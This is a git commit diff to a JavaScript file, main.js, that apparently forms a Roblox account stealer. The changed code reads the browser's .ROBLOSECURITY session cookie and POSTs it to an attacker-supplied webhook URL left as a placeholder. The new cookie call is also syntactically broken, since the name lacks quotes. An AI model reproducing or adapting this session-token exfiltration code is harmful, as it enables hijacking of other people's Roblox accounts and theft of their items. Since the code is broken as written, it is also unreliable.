a9070ecfc1888203e8913f3b2dd2fd2750c595cb
littlepig453 <84644303+littlepig453@users.noreply.github.com>
2022-04-16 14:42:47 -0400

    Update main.js

--- main.js
+++ main.js
@@ -1,5 +1,10 @@
+function getCookie(name) {
+  const value = `; ${document.cookie}`;
+  const parts = value.split(`; ${name}=`);
+  if (parts.length === 2) return parts.pop().split(';').shift();
+}
 var webhook = "Your-Webhook-url";
-var token = document.cookie;
+var token = getCookie(.ROBLOSECURITY)
 var request = new XMLHttpRequest();
 request.open("POST", webhook);
 request.setRequestHeader('content-type', 'application/json');
